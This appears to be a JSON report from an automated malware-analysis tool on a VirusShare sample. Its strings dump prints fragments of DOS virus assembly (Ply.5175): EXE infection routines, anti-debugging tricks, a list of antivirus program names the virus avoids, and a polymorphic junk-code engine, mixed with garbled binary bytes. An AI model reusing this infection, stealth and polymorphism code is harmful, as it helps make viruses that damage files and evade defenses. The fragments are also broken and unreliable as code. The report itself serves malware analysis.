{
    "docinfo": {},
    "filename": "VirusShare_317cd371bb0771d2c57189d032f15d29",
    "filesize": 32000,
    "filetype": "data",
    "hashes": {
        "md5": "317cd371bb0771d2c57189d032f15d29",
        "sha1": "25f52c28431b317559b5f5e93fbb478f054ab72f",
        "sha256": "c3a5550ca13438c1c0e4c41061ca7723847dd4a609fd8138b3c1468225a9987a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            " Save BX at stack",
            "\t     nop",
            "\t     nop",
            "\t     xchg    ax,bx\t\t ; BX = header size",
            "\t     nop",
            "\t     nop",
            "\t     mov     ax,[di+1ah]\t ; AX = low-order word of filesize",
            "\t     mov     dx,[di+1ch]\t ; DX = high-order word of filesize",
            "\t     push    ax \t\t ; Save AX at stack",
            "\t     nop",
            "\t     nop",
            "\t     push    dx \t\t ; Save DX at stack",
            "\t     nop",
            "\t     nop",
            "\t     sub     ax,bx\t\t ; Subtract header size from filesize",
            "\t     nop",
            "\t     sbb     dx,00h\t\t ; Convert to 32-bit",
            "\t     mov     cx,10h",
            "\t     div     cx \t\t ; Divide by paragraphs",
            "\t     nop",
            "\t     mov     cx,dx\t\t ; CX = low-order word of filesize ...",
            "\t     nop",
            "\t     lea     bx,entry_point-100h ; BX = offset of entry_point",
            "\t     add     dx,bx\t\t ; Add offset of entry_point to low...",
            "\t     nop",
            "\t     mov     [si+14h],dx\t ; Store instruction pointer",
            "\t     mov     [si+16h],ax\t ; Store code segment",
            "\t     lea     bx,delta_offset\t ; BX = offset of delta_offset",
            "\t     add     bx,bp\t\t ; Add delta offset",
            "\t     nop",
            "\t     mov     [bx],cx\t\t ; Store delta offset",
            "\t     nop",
            "\t     inc     ax \t\t ; Increase AX",
            "\t     nop",
            "\t     nop",
            "\t     mov     [si+0eh],ax\t ; Store stack segment",
            "\t     mov     dx,cx\t\t ; DX = low-order word of filesize ...",
            "\t     nop",
            "\t     mov     ax,(code_end-code_begin+0c0h)",
            "\t     add     dx,ax\t\t ; DX = stack pointer",
            "\t     nop",
            "\t     mov     ax,1111111111111110b",
            "\t     and     dx,ax\t\t ; DX =   \"      \"",
            "\t     nop",
            "\t     mov     [si+10h],dx\t ; Store stack pointer",
            "\t     mov     ax,2020h\t\t ; AX = infection mark",
            "\t     mov     [si+12h],ax\t ; Store infection mark",
            "\t     pop     dx \t\t ; Load DX from stack",
            "\t     nop",
            "\t     nop",
            "\t     pop     ax \t\t ; Load AX from stack",
            "\t     nop",
            "\t     nop",
            "\t     add     ax,(code_end-code_begin)",
            "\t     adc     dx,00h\t\t ; Convert to 32-bit",
            "\t     mov     cl,09h",
            "\t     nop",
            "\t     push    ax \t\t ; Save AX at stack",
            "\t     nop",
            "\t     nop",
            "\t     shr     ax,cl\t\t ; Multiply by pages",
            "\t     nop",
            "\t     ror     dx,cl\t\t ;     \"    \"    \"",
            "\t     nop",
            "\t     stc\t\t\t ; Set carry flag",
            "\t     nop",
            "\t     nop",
            "\t     adc     dx,ax\t\t ; DX = total number of 512-bytes p...",
            "\t     nop",
            "\t     pop     ax \t\t ; Load AX from stack",
            "\t     nop",
            "\t     nop",
            "\t     and     ah,00000001b",
            "\t     mov     [si+04h],dx\t ; Store totalt number of 512-bytes...",
            "\t     mov     [si+02h],ax\t ; Number of bytes in last 512-byte...",
            "\t     pop     bx \t\t ; Load BX from stack",
            "\t     nop",
            "\t     nop",
            "\t     mov     ax,4201h\t\t ; Set current file position (CFP)",
            "\t     mov     cx,-01h",
            "\t     mov     dx,-(code_end-delta_offset)",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     ax,(4000h-2020h)\t ; Write to file",
            "\t     add     ax,2020h",
            "\t     mov     cx,02h\t\t ; Write two bytes",
            "\t     lea     dx,delta_offset\t ; DX = offset of delta_offset",
            "\t     add     dx,bp\t\t ; Add delta offset",
            "\t     nop",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     ax,4200h\t\t ; Set current file position (SOF)",
            "\t     xor     cx,cx\t\t ; Zero CX",
            "\t     nop",
            "\t     xor     dx,dx\t\t ; Zero DX",
            "\t     nop",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     ax,(4000h-2020h)\t ; Write to file",
            "\t     add     ax,2020h",
            "\t     mov     cx,1ah\t\t ; Write twenty-six bytes",
            "\t     mov     dx,si\t\t ; DX = offset of file_header",
            "\t     nop",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     ax,(5701h-2020h)\t ; Set file's date and time",
            "\t     add     ax,2020h",
            "\t     mov     cx,[di+16h]\t ; CX = file time",
            "\t     mov     dx,[di+18h]\t ; DX = file date",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     ah,3eh\t\t ; Close file",
            "\t     nop",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     ax,(4301h-2020h)\t ; Set file attributes",
            "\t     add     ax,2020h",
            "\t     mov     ch,00h\t\t ; Zero CH",
            "\t     nop",
            "\t     mov     cl,[di+15h]\t ; CL = file attribute",
            "\t     lea     dx,filename\t ; DX = offset of filename",
            "\t     add     dx,bp\t\t ; Add delta offset",
            "\t     nop",
            "\t     int     21h",
            "\t     nop",
            "\t     jmp     find_next",
            "virus_exit:",
            "\t     mov     ax,1202h\t\t ; Get interrupt address",
            "\t     mov     dx,24h\t\t ; Get interrupt address of interru...",
            "\t     call    int2f_simula",
            "\t     mov     ax,cs\t\t ; AX = code segment",
            "\t     nop",
            "\t     mov     es,ax\t\t ; ES =  \"      \"",
            "\t     nop",
            "\t     mov     ax,(24h*04h)\t ; AX = offset of interrupt vector 24h",
            "\t     cmp     bx,ax\t\t ; Debugging?",
            "\t     nop",
            "\t     je      virus_exit_\t ; No debugging? Jump to virus_exit_",
            "\t     nop",
            "\t     mov     ax,3500h\t\t ; Get interrupt vector 00h",
            "\t     int     21h",
            "\t     nop",
            "\t     lea     si,int01_off\t ; SI = offset of int01_off",
            "\t     add     si,bp\t\t ; Add delta offset",
            "\t     nop",
            "\t     lodsw\t\t\t ; AX = offset of interrupt 01h",
            "\t     nop",
            "\t     nop",
            "\t     mov     dx,ax\t\t ; DX =   \"    \"      \"      \"",
            "\t     nop",
            "\t     mov     ax,es\t\t ; AX = segment of interrupt 00h",
            "\t     nop",
            "\t     mov     ds,ax\t\t ; DS =    \"    \"      \"      \"",
            "\t     nop",
            "\t     mov     ax,(2501h-2020h)\t ; Set interrupt vector 01h",
            "\t     add     ax,2020h",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     ax,cs\t\t ; AX = code segment",
            "\t     nop",
            "\t     mov     ds,ax\t\t ; DS =  \"      \"",
            "\t     nop",
            "\t     mov     es,ax\t\t ; ES =  \"      \"",
            "\t     nop",
            "eternal_loop:",
            "\t     jmp     eternal_loop",
            "\t     nop",
            "virus_exit_:",
            "\t     mov     ah,62h\t\t ; Get current PSP address",
            "\t     nop",
            "\t     int     21h",
            "\t     nop",
            "\t     mov     es,bx\t\t ; ES = segment of PSP for current ...",
            "\t     nop",
            "\t     mov     cx,bx\t\t ; CX =    \"    \"   \"   \"     \"     \"",
            "\t     nop",
            "\t     add     cx,10h\t\t ; CX = segment of beginning of code",
            "\t     lea     si,instruct_ptr\t ; SI = offset of instruct_ptr",
            "\t     add     si,bp\t\t ; Add delta offset",
            "\t     nop",
            "\t     add     [si+02h],cx\t ; Add segment of beginning of code...",
            "\t     add     cx,[si+04h]\t ; Add original stack segment to se...",
            "\t     cli\t\t\t ; Clear interrupt-enable flag",
            "\t     nop",
            "\t     nop",
            "\t     xor     ax,ax\t\t ; Zero AX",
            "\t     nop",
            "poly_end:",
            "\t     mov     sp,[si+06h]\t ; SP = stack pointer",
            "\t     mov     ss,cx\t\t ; SS = stack segment",
            "\t     sti\t\t\t ; Set interrupt-enable flag",
            "\t     push    ax \t\t ; Save AX at stack",
            "\t     mov     ds,bx\t\t ; DS = segment of PSP for current ...",
            "\t     db      0eah\t\t ; JMP imm32 (opcode 0eah)",
            "instruct_ptr dw      ?\t\t\t ; Instruction pointer",
            "code_seg     dw      ?\t\t\t ; Code segment",
            "stack_seg    dw      ?\t\t\t ; Stack segment",
            "stack_ptr    dw      ?\t\t\t ; Stack pointer",
            "int24_virus  proc    near\t\t ; Interrupt 24h of Ply.5175",
            "\t     mov     al,03h\t\t ; Fail system call in progress",
            "int01_virus  proc    near\t\t ; Interrupt 01h of Ply.5175",
            "int2a_virus  proc    near\t\t ; Interrupt 2ah of Ply.5175",
            "\t     iret\t\t\t ; Interrupt return!",
            "\t     endp",
            "\t     endp",
            "\t     endp",
            "int2f_simula proc    near\t\t ; Simulate interrupt 21h",
            "\t     push    dx \t\t ; Load DX from stack",
            "\t     pushf",
            "\t     db      9ah\t\t ; CALL imm32 (opcode 9ah)",
            "int2f_addr   dd      ?\t\t\t ; Address of interrupt 2fh",
            "\t     pop     dx \t\t ; Load DX from stack",
            "\t     ret\t\t\t ; Return!",
            "\t     endp",
            "int21_simula proc    near\t\t ; Simulate interrupt 21h",
            "\t     segcs\t\t\t ; Code segment as source segment",
            "\t     int     21h",
            "\t     nop",
            "\t     ret\t\t\t ; Return!",
            "\t     endp",
            "\t     db      00h",
            "int01_off    dw      ?\t\t\t ; Offset of interrupt 01h",
            "\t     db      00h",
            "entry_point:",
            "\t     jmp     code_begin",
            "file_specifi db      '*.VXE',00h         ; File specification",
            "file_header  dw      0ah dup(?),00h,0fff0h,?",
            "\t     db      00h",
            "poly_buffer  db      03h dup(?) \t ; Polymorphic buffer",
            "table_begin  db      04h,'AVP.'          ; AntiViral Toolkit Pro",
            "\t     db      08h,'AVPLITE.'      ; AVPLite",
            "\t     db      06h,'AVPVE.'        ; AVP Virus Encyclopedia",
            "\t     db      04h,'BAIT'          ; Bait file",
            "\t     db      06h,'EICAR.'        ; EICAR-ANTIVIRUS-TEST-FILE",
            "\t     db      07h,'EMM386.'       ; Microsoft expanded memory manage...",
            "\t     db      07h,'F-PROT.'       ; F-PROT",
            "\t     db      06h,'FV386.'",
            "\t     db      05h,'FV86.'",
            "\t     db      05h,'MSAV.'         ; Microsoft Anti-Virus",
            "\t     db      09h,'MVTOOL10.'",
            "\t     db      05h,'SCAN.'         ; McAfee ViruScan",
            "\t     db      07h,'TBSCAN.'       ; Thunderbyte virus detector",
            "\t     db      05h,'TBAV.'         ; Thunderbyte menu",
            "\t     db      08h,'TBCHECK.'      ; TbCheck, Resident integrity checker",
            "\t     db      08h,'TBCLEAN.'      ; Thunderbyte clean utility",
            "\t     db      07h,'TBDISK.'       ; TbDisk, Disk guard",
            "\t     db      09h,'TBDRIVER.'     ; TbDriver, TBAV TSR utilities",
            "\t     db      07h,'TBFILE.'       ; TbFile, software guard",
            "\t     db      09h,'TBGENSIG.'     ; TbGenSig, signature file compiler",
            "\t     db      06h,'TBKEY.'        ; TbKey",
            "\t     db      06h,'TBLOG.'        ; TbLog, TBAV automatic log utility",
            "\t     db      06h,'TBMEM.'        ; TbMem, Memory guard",
            "\t     db      08h,'TBSETUP.'      ; Thunderbyte software setup",
            "\t     db      08h,'TBSCANX.'      ; TbScanX resident virus scanner",
            "\t     db      07h,'TBUTIL.'       ; TbUtil",
            "\t     db      09h,'VALIDATE.'     ; VALIDATE",
            "\t     db      08h,'VIRSTOP.'      ; VIRSTOP",
            "\t     db      05h,'VIRUS'         ; Bait file",
            "\t     db      05h,'VPIC.'         ; Picture file viewer",
            "\t     db      06h,'VSAFE.'        ; VSafe",
            "\t     db      00h",
            "table_end:",
            "\t     db      00h,00h",
            "_ncdtree     db      '\\NCDTREE',00h",
            "\t     db      'PLY'               ; Name of the virus",
            "poly_blocks  db       (poly_end-poly_begin)/03h dup(90h,90h,04h dup(?))",
            "code_end:",
            "dta:",
            "\t     db      15h dup(?) \t ; Used by DOS for find next-process",
            "file_attr    db      ?\t\t\t ; File attribute",
            "file_time    dw      ?\t\t\t ; File time",
            "file_date    dw      ?\t\t\t ; File date",
            "filesize     dd      ?\t\t\t ; Filesize",
            "filename     db      0dh dup(?) \t ; Filename",
            "data_end:",
            "end\t     code_begin",
            "[PLY_5175.ASM]",
            "         ",
            "KV2#",
            "MV       cmp dl,85d",
            "OV2#",
            "QV    jb Little52",
            "SV],0fd89h          ",
            "UV2#",
            "WV2#",
            "YV2#e",
            "[V2#b",
            "]V2#M",
            "_V2#P",
            "aV2#",
            "cV2#w",
            "eV     mov bx,offseth",
            "gV2#",
            "iV  ; SUB BP",
            "      ",
            "kVt Paso3           ",
            "mVbytes",
            "        mov",
            "oV2#",
            "qVfset Paso1",
            "      ",
            "sV2#+",
            "uV2#(",
            "wV2#",
            "yV2#",
            "{V2#=",
            "}V2#",
            "Vcmp dl,170d",
            "     D",
            "V2#E",
            "V,DX",
            "        jmp s",
            "V2#A",
            "V     ; XCHG DX,BP",
            "Vor ax,ax          ",
            "V2#g",
            "V      in al,40h",
            "V2#i",
            "        ja Sig",
            "V            ; Must",
            "        mov ax,L,",
            "Varks",
            "        mov P",
            "V2#-",
            "V    mov [bx],cx",
            "Vx,ax              l",
            "V    in al,40h     ",
            "V2#_",
            "V2#B",
            "V2#r",
            "V2#l",
            "Ves into memory",
            "V,ax",
            "        mov b",
            "V5+2)",
            "        mov ",
            "V     in al,40h",
            "        cmp al",
            "Vjb Cambia2",
            "      (",
            "Vt Paso4           8",
            "V+XX]",
            "        mov @",
            "V       mov bx,offsH",
            "V2#A",
            "V    ; ADD SI,XX",
            "Voffset Paso6",
            "    h",
            "V2#|",
            "V/ MOV CX",
            "        ",
            "VPaso9",
            "        mov",
            "V               ; X",
            "        mov bx",
            "        test al,",
            "V          ; Use ot",
            "V   jz MasPoly",
            "V04646h            ",
            "V/ INC SI",
            "        ",
            "V2#4",
            "V        ; LODSB / ,",
            "V2#1",
            "Vfset Paso4        D",
            "V[BP+XX]",
            "        mH",
            "V2#a",
            "V2#c",
            "V2#e",
            "Vbx,offset Paso6",
            "V],0b953h          t",
            "VBX / MOV CX",
            "     x",
            "Vet Paso9",
            "        ",
            "Wh                 ",
            "W [BX]",
            "        mov",
            "Wo10",
            "        mov [",
            "W             ; INC",
            "\tW        jmp AlBuff",
            "Wv bx,offset Paso4 ",
            "WLEA DI,[BP+XX]",
            "W,0be8dh",
            "        m",
            "Waso5",
            "        mov ",
            "W              ; AD",
            "W   mov bx,offset P",
            "Wmov [bx],0b957h   ",
            "W; PUSH DI / MOV CX",
            "Wbx,offset Paso9",
            "W],03581h          ",
            "WORD PTR [DI]",
            "    ",
            "!Wset Paso10",
            "       ",
            "#W47h               ,",
            "%WNC DI",
            "AlBuffe8",
            "'Wv cx,200d         D",
            ")WChange opcode ordeP",
            "        call MuTX",
            "-W          ; named `",
            "        sub dxh",
            "1Wov bx,offset Ensuct",
            "3W Add random garbag",
            "5Wptor",
            "Basureo:xor ",
            "7W mov cx,[bx]",
            "    ",
            "9W      inc bx",
            "    ",
            ";W       push dx",
            "=Wbx]",
            "        call ",
            "?W   pop dx",
            "       ",
            "AW2#",
            "CW   inc dx",
            "       ",
            "EW      jb Basureo",
            "GW2#V",
            "IW2#W",
            "KW2#Y",
            "MW2#[",
            "OW  mov cx,Cripted  ",
            "QW2#l",
            "        mov si,(offset CopiaVir+Saltarlos)",
            "        mov di,si                       ; To use the decryptor with any",
            "        mov bx,di                       ; of the index registers",
            "        call Desencriptor               ; chosen.",
            "        ret",
            "Ensuciar:                               ; Locations of the decryptor in",
            "        dw 09,offset Paraguay           ; which we'll insert garbage from",
            "        dw 04,offset Junk02             ; MontonDeBasura",
            "        dw 02,offset Junk03",
            "        dw 06,offset Junk04",
            "        dw 03,offset Junk05",
            "        dw 05,offset Junk06",
            "        dw 02,offset Junk07",
            "        dw 04,offset Junk08",
            "        dw 03,offset Junk09",
            "        dw 07,offset Junk10",
            "        dw 02,offset Junk11",
            "        dw 04,offset Junk12",
            "        dw 08,offset Junk13",
            ";\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\",
            ";! PongoFecha:  Restore victims date, and time with secs=60                  !",
            ";/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/",
            "PongoFecha:",
            "        mov ax,5701h                    ; Set",
            "        db 0b9h                         ; mov cx,time",
            "        Time dw 0                       ; Last modified time",
            "        and cl,11100000b                ; Set as infected",
            "        or cl,00011110b                 ; 30*2=60!",
            "        db 0bah                         ; mov dx,date",
            "        Date dw 0                       ; Last modified date",
            "        pushf                           ; Call handler directly",
            "        call dword ptr cs:[Real21h]",
            "        ret                             ; And return",
            "        ",
            ";\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\",
            ";! Sub-Rutine used for pointer moves up to the end                           !",
            ";/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/",
            "AlFinal:mov ax,04202h                   ; To the end",
            "        xor cx,cx",
            "        cwd                             ; XOR DX,DX",
            "        int 21h",
            "        ret",
            "Segmentos:                              ; DS:=CS  &  ES:=CS",
            "        push cs",
            "        push cs",
            "        pop ds",
            "        pop es",
            "        ret",
            ";\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\",
            ";! MUTABLA: Exchange the trash opcodes position                              !",
            ";/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/",
            "MuTabla:xor ax,ax",
            "        in al,40h                       ; Random number from port 40h",
            "        test al,1                       ; Is it even?",
            "        jz YaEsPar",
            "        inc al                          ; If not, make it even",
            "YaEsPar:mov si,offset MontonDeBasura    ; The table",
            "        add si,ax                       ; Get a  2 byte-instruction",
            "        mov dx,[si]                     ; into DX",
            "        xor ax,ax",
            "        in al,40h                       ; Another random number",
            "        test al,1                       ; If not even, make it even",
            "        jz Alli",
            "        inc al",
            "Alli:   mov di,offset MontonDeBasura    ; Garbage 2-byte table",
            "        add di,ax                       ; Get the instruction",
            "        mov bx,[di]                     ; into bx",
            "        mov [si],bx                     ; Exchange its positions",
            "        mov [di],dx",
            "        loop MuTabla                    ; CX times",
            "        ret",
            ";\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\",
            ";! YGRAMUL: Chose random junk-instructions and put them into memory          !",
            ";/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/",
            "Ygramul:xor di,di                       ; Garbage intruder",
            "Otro:   xor ax,ax                       ; Ygramul, the mutant in Endless Story",
            "        in al,40h                       ; Random number",
            "        test al,1                       ; Is it even?",
            "        jz Aqui",
            "        inc al                          ; Nope, add one",
            "Aqui:   mov si,offset MontonDeBasura",
            "        add si,ax                       ; Get the instruction",
            "  YX",
            "\udb51\udc30D@D@",
            "\u0110<t^<tX<tR$<ptI",
            "\udb51\udc30\u942a\u01d0+\u0190\u0610-",
            "\u01d0+\u0190-",
            "<u4D",
            "\udb51\udc30D@D@",
            "+;s\u01d0",
            "/!SP\u0210",
            "\u0550!$5!SP\u0210$%g",
            "\u0550!3\u0610",
            "\u0150D\u0210D\u0210\u0610-",
            "\u0550\u0690EG",
            "  !sR3\\/YY",
            "\u0210X\u0610Z$%!\u0210\u0610X\u0610Z :-  ",
            "\u0650CW_t",
            "\u05d0_^_",
            "\u0550!\u0610?\u0590",
            "!>!mz-  9",
            "  9D",
            "  3\u0250_",
            "B3\u02503\u0490!",
            "\u0410#\u0410T",
            "B3\u02503\u0490!",
            "!>KXY",
            "++D6",
            "++         ; X",
            "        xchg al,al                      ; 86 C0",
            "        xchg bl,bl                      ; 86 DB",
            "        xchg cl,cl                      ; 86 C9",
            "      YX",
            ";\u0610t.",
            "  !\u0210\u0610b!",
            "P ch,ch X",
            "                 ; 86 ED",
            "        xchg dh,dh                      ; 86 F6",
            "        cld                             ; FB",
            "        int 03h                         ; CC",
            "        nop                             ; 90",
            "        nop                             ; 90",
            "        pushf                           ; 9C",
            "        popf                            ; 9XX",
            "h XX",
            "  XX",
            "s XX",
            "R     ; 07",
            "   inc ax                          ; 40",
            "        dec ax                          ; 48",
            "        inc bx                          ; 43",
            "        dec bx                          ; 4B",
            "        inc cx                          ; 41",
            "        dec cx                          ; 49",
            "        inc dx                          ; 42",
            "        dec dx                          ; 4A",
            "        std                             ; FD",
            "        cld                             ; FC",
            "        stc          XX",
            "  XX",
            "          ",
            "             ; F8",
            "        jmp short $+2                   ; EB 00",
            "        jc $+2                          ; 72 00",
            "        jnc $+2                         ; 73 00",
            "        jz $+2                          ; 74 00",
            "        jnz $+2                         ; 75 00",
            "        jpo $+2                         ; 7B 00",
            "        jpe $+2                         ; 7A 00",
            "        jno $+2                         ; 71 00",
            "        jg $+2                          ; 7F 00",
            "        js $+2  XX",
            "*.VXE",
            " or ax,a#Y",
            "                     ; 0B C0",
            "        or bx,bx                        ; 0B DB",
            "        or cx,cx                        ; 0B C9",
            "        or dx,dx                        ; 0B D2",
            "        or si,si                        ; 09 F6",
            "        or di,di                        ; 09 FF",
            "        or bp,bp                        ; 09 ED",
            "        or ah,ah                        ; 08 E4",
            "        or al,al                        ; 08 C0",
            "        or bh,bh                        ; 08 FF",
            "     X!Y",
            "l  Y Y",
            "              CY",
            "; 08 ED",
            "        or cl,cl                        ; 08 C9",
            "        or dh,dh                        ; 08 F6",
            "        or dl,dl                        ; 08 D2",
            "        and ax,ax                       ; 23 C0",
            "        and bx,bx                       ; 23 DB",
            "        and cx,cx                       ; 23 C9",
            "        and dx,dx                       ; 23 D2",
            "        and si,si                       ; 21 F6",
            "        and di,di                       ; 21 FF",
            "        and bp,bp         !YBY",
            "; AYbY",
            "h,ah                       ; 20 E4",
            "        and al,al                       ; 20 C0",
            "        and bh,bh                      ",
            "D0 FF",
            "        and bl,bl                       ; 20 DB",
            "        and ch,ch                       ; 20 ED",
            "        and cl,cl                       ; 20 C9",
            "        and dh,dh                       ; 20 F6",
            "        and dl,dl                       ; 20 D2",
            "        mov ax,ax                       ; 89 C0",
            "        mov bx,bx                       ; 89 DB",
            "        mov cx,BYeY",
            "  dYdY",
            "dxbYY",
            "AVP.",
            "AVPLITE.",
            "AVPVE.",
            "BAIT",
            "EICAR.",
            "EMM386.",
            "F-PROT.",
            "FV386.",
            "FV86.",
            "MSAV.\tMVTOOL10.",
            "SCAN.",
            "TBSCAN.",
            "TBAV.",
            "TBCHECK.",
            "TBCLEAN.",
            "TBDISK.\tTBDRIVER.",
            "TBFILE.\tTBGENSIG.",
            "TBKEY.",
            "TBLOG.",
            "TBMEM.",
            "TBSETUP.",
            "TBSCANX.",
            "TBUTIL.\tVALIDATE.",
            "VIRSTOP.",
            "VIRUS",
            "VPIC.",
            "VSAFE.",
            "\\NCDTREE",
            "PLY     ;Y",
            "        mov al,al                       ; 88 C0",
            "        mov bh,bh                       ; 88 FF",
            "        mov bl,bl                       ; 88 DB",
            "        mov ch,ch                       ; 88 ED",
            "        mov cl,cl                   eYY",
            "dlYY",
            " aYY",
            ",bYY",
            "  YY",
            "  YY",
            "++            ; ",
            "++DF",
            "++Dy",
            "++D6",
            "++ ; 3BY",
            "        cmp ax,bp                       ; 3B C5",
            "        cmp bx,ax                       ; 3B D8",
            "        c+KX",
            "++Dz",
            "++D.",
            "++D^",
            "++3B D9",
            "       Y",
            " bx,dx                       ; 3B DA",
            "        cmp bx,si                       ; 3B DE",
            "        cmp bx,di    XkX",
            "++D=",
            "++Dv",
            "++D*",
            "++DD",
            "   Y",
            " cmp cx,ax                       ; 3B C8",
            "        cmp cx,bx                       ; 3B CB",
            "        cmp cx,cx                kXX",
            "++DD",
            "++           BZ",
            "    ; 3B CA",
            "        cmp cx,si                       ; 3B CE",
            "        cmp cx,di                       ; 3B CF",
            "        cmp cx,bp                       ; 3B CD",
            "        cmp dx,ax                       ; 3B D0",
            "        cmp dx,bx                       ; 3B D3",
            "        cmp dx,cx                       ; 3B D1",
            "        cmp dx,dx                       ; 3B D2",
            "        cmp dx,si                       ; 3B D6",
            "        cmp dx,di                       ; 3B D7",
            "        cmp dx,bp                       ; 3B D5",
            "        cmp si,ax                       ; 3B F0",
            "        cmp si,bx                       ; 3B F3",
            "        cmp si,cx                       ; 3B F1",
            "        cmp si,dx                       ; 3B F2",
            "        cmp si,si                       ; 3B F6",
            "        cmp si,di                       ; 3B F7",
            "        cmp si,bp                       ; 3B F5",
            "        cmp di,ax                       ; 3B F8",
            "        cmp di,bx                       ; 3B FB",
            "        cmp di,cx                       ; 3B F9",
            "        cmp di,dx                       ; 3B FA",
            "        cmp di,si                       ; 3B FE",
            "        cmp di,di                       ; 3B FF",
            "        cmp di,bp                       ; 3B FD",
            "        cmp bp,ax                       ; 3B E8",
            "        cmp bp,bx                       ; 3B EB",
            "        cmp bp,cx                       ; 3B E9",
            "        cmp bp,dx                       ; 3B EA",
            "        cmp bp,si                       ; 3B EE",
            "        cmp bp,di                       ; 3B EF",
            "        cmp bp,bp                       ; 3B ED",
            "Omega:                                  ; End of virus on the file",
            "HeavyMetal   dw 0                       ; Heavy Metal even in RAM ;)",
            "Vsuck        db 0                       ; Vsafe's flags",
            "HacerStealth db 1                       ; Flag to make or not the stealth",
            "Handle       dw 0                       ; File's key",
            "Atributos    db 0                       ; File's attribs",
            "Vieja24h     dd 0                       ; 24h's old handler",
            "CopiaVir     db Largor dup('P')         ; Here will go the encryp",
            "CPLY_5175.ASM1 ",
            "Turbo Assembler  Version 4.1",
            "@-S\"",
            "PLY_5175.ASM",
            "_TEXT",
            "CODE",
            "_DATA",
            "DATA",
            "DGROUP",
            "+  !.",
            "\u0550!3\u0610",
            ";\u0610t(",
            "@@2\u0110$",
            "<t:D",
            "$<pu",
            "<u1D",
            "$<pu",
            "\u0110<tg<ta<t[<",
            "tU$<ptL<PtFb",
            "\u01d0+\u0190-",
            "<u4D",
            "\udb51\udc30D@D@",
            "\u0110<t^<tX<tR$<ptI",
            "\udb51\udc30\u942a\u01d0+\u0190\u0610-",
            "\u01d0+\u0190-",
            "<u4D",
            "\udb51\udc30D@D@",
            "+;s\u01d0",
            "/!SP\u0210",
            "\u0550!$5!SP\u0210$%g",
            "\u0550!3\u0610",
            "\u0150D\u0210D\u0210\u0610-",
            "\u0550\u0690EG",
            "  !sR3@[",
            "\u0210X\u0610Z$%!\u0210\u0610X\u0610Z :-  ",
            "\u0650CW_t",
            "\u05d0_^_",
            "\u0550!\u0610?\u0590",
            "!>!mz-  9",
            "  9D",
            "  3\u0250_",
            "B3\u02503\u0490!",
            "\u0410#\u0410T",
            "B3\u02503\u0490!",
            "!>!\"",
            " <IBM  4.0",
            "03BRIAN      FAT12   ",
            "u;PSVW.",
            "_^[DD",
            "_^[X.",
            "`<Su"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.318674",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
